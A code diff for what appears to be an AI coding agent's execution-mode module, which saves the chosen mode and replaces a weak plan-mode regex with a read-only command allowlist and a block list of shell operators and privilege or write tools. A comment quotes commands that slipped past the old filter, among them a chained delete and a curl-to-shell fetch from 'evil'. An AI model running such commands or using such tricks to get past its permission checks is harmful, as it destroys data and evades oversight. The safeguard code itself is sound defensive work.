@@ -10,16 +10,48 @@ export type ExecutionMode =
 
 const CYCLE_ORDER: ExecutionMode[] = ["auto", "edit-automatically", "plan", "manual"];
 
+const ALL_MODES: readonly ExecutionMode[] = [...CYCLE_ORDER, "dangerously-skip-permissions"];
+
 let currentMode: ExecutionMode = "auto";
 let initialDangerFlag = false;
+/** Set by setExecutionModePersistence so a cycle can save the new mode. */
+let persistMode: ((mode: ExecutionMode) => void) | undefined;
 
-export function initExecutionMode(dangerouslySkipPermissions?: boolean): void {
+/** Narrow an arbitrary config value to a known mode. */
+export function isExecutionMode(value: unknown): value is ExecutionMode {
+  return typeof value === "string" && (ALL_MODES as readonly string[]).includes(value);
+}
+
+/**
+ * Install a sink called with every mode change, so the CLI can persist the
+ * choice. Pass undefined to disable. Persistence is deliberately a callback
+ * rather than a hard dependency: execution-modes stays pure and testable, and
+ * a CLI that has no config file (tests, RPC mode) still works.
+ */
+export function setExecutionModePersistence(sink: ((mode: ExecutionMode) => void) | undefined): void {
+  persistMode = sink;
+}
+
+/**
+ * @param dangerouslySkipPermissions --dangerously-skip-permissions was passed.
+ * @param restoredMode            a mode previously saved to config.
+ *
+ * Precedence: an explicit CLI flag always wins over saved state (the user just
+ * typed it), and saved state wins over the default. A restored
+ * `dangerously-skip-permissions` is honoured because the user opted in on a
+ * previous run, but the flag is what re-arms it in a fresh shell.
+ */
+export function initExecutionMode(
+  dangerouslySkipPermissions?: boolean,
+  restoredMode?: ExecutionMode,
+): void {
   if (dangerouslySkipPermissions) {
     initialDangerFlag = true;
     currentMode = "dangerously-skip-permissions";
-  } else {
-    currentMode = "auto";
+    return;
   }
+  initialDangerFlag = false;
+  currentMode = restoredMode ?? "auto";
 }
 
 export function getExecutionMode(): ExecutionMode {
@@ -28,16 +60,19 @@ export function getExecutionMode(): ExecutionMode {
 
 export function setExecutionMode(mode: ExecutionMode): void {
   currentMode = mode;
+  persistMode?.(mode);
 }
 
 export function cycleExecutionMode(): ExecutionMode {
   if (currentMode === "dangerously-skip-permissions") {
     currentMode = "auto";
+    persistMode?.(currentMode);
     return currentMode;
   }
   const idx = CYCLE_ORDER.indexOf(currentMode);
   const nextIdx = (idx + 1) % CYCLE_ORDER.length;
   currentMode = CYCLE_ORDER[nextIdx] ?? "auto";
+  persistMode?.(currentMode);
   return currentMode;
 }
 
@@ -76,6 +111,84 @@ const READ_ONLY_TOOLS = new Set([
 
 const WRITE_TOOLS = new Set(["write", "write_file", "edit", "edit_file"]);
 
+/**
+ * Commands that only read. Plan mode allows these and nothing else.
+ *
+ * The previous implementation matched a prefix allowlist with one regex, which
+ * let `ls; rm -rf x`, `cat f && curl evil|sh` and `git status > file` through.
+ * This table fixes that in two steps: the whole command must start with a
+ * read-only verb, and the shell operators below must not appear at all.
+ */
+const READ_ONLY_COMMAND_PREFIXES = [
+  "ls",
+  "pwd",
+  "cat",
+  "head",
+  "tail",
+  "wc",
+  "find",
+  "grep",
+  "rg",
+  "echo",
+  "which",
+  "stat",
+  "file",
+  "du",
+  "df",
+  "tree",
+  "git status",
+  "git diff",
+  "git log",
+  "git show",
+  "git branch",
+  "git remote",
+  "git blame",
+  "git rev-parse",
+  "git ls-files",
+  "git stash list",
+  "git tag",
+  "node --version",
+  "npm ls",
+  "bun --version",
+];
+
+/**
+ * Shell constructs that can write, chain or execute arbitrary code. Any of
+ * these disqualifies a command in plan mode regardless of its leading verb.
+ */
+const PLAN_MODE_FORBIDDEN_PATTERNS: ReadonlyArray<{ re: RegExp; why: string }> = [
+  { re: />>?/, why: "output redirection" },
+  { re: /\|/, why: "pipes" },
+  { re: /&&|\|\||;/, why: "command chaining" },
+  { re: /`|\$\(/, why: "command substitution" },
+  { re: /\b(sudo|su|doas)\b/, why: "privilege escalation" },
+  { re: /\b(xargs|tee|dd|truncate|shred)\b/, why: "indirect writes" },
+];
+
+/**
+ * Should this bash command be rejected while plan mode is active?
+ * Returns the reason string when blocked, or undefined when allowed.
+ */
+export function planModeBashBlockReason(command: string): string | undefined {
+  const cmd = command.trim();
+  if (!cmd) return undefined;
+
+  for (const { re, why } of PLAN_MODE_FORBIDDEN_PATTERNS) {
+    if (re.test(cmd)) {
+      return `Command blocked in Plan Mode (${why}): "${cmd}". Plan mode is read-only — press Shift+Tab to leave it.`;
+    }
+  }
+
+  const lower = cmd.toLowerCase();
+  const allowed = READ_ONLY_COMMAND_PREFIXES.some(
+    (prefix) => lower === prefix || lower.startsWith(`${prefix} `),
+  );
+  if (!allowed) {
+    return `Command blocked in Plan Mode (not a read-only command): "${cmd}". Press Shift+Tab to leave plan mode.`;
+  }
+  return undefined;
+}
+
 export async function checkToolExecutionPermission(
   toolName: string,
   input: unknown,
@@ -100,13 +213,8 @@ export async function checkToolExecutionPermission(
     }
     if (lowerName === "bash") {
       const cmd = ((input as { command?: string })?.command || "").trim();
-      if (cmd && !/^(ls|pwd|cat|head|tail|git status|git diff|git log|find|grep|echo)\b/i.test(cmd)) {
-        return {
-          block: true,
-          reason:
-            `Command blocked in Plan Mode: "${cmd}". Press Shift+Tab to switch modes to run modifying commands.`,
-        };
-      }
+      const blocked = planModeBashBlockReason(cmd);
+      if (blocked) return { block: true, reason: blocked };
     }
     return { block: false };
   }
